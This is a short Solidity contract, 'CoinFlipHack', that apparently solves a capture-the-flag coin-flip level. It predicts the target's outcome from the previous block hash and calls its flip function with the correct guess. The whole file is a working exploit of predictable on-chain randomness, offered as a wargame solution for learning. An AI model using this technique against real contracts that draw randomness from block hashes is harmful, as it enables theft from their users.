// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipHack {
    error WrongGuess();

    CoinFlip private immutable TARGET;

    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        TARGET = CoinFlip(_target);
    }

    function attack() external {
        bool guess = _guess();
        if (!TARGET.flip(guess)) revert WrongGuess();
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
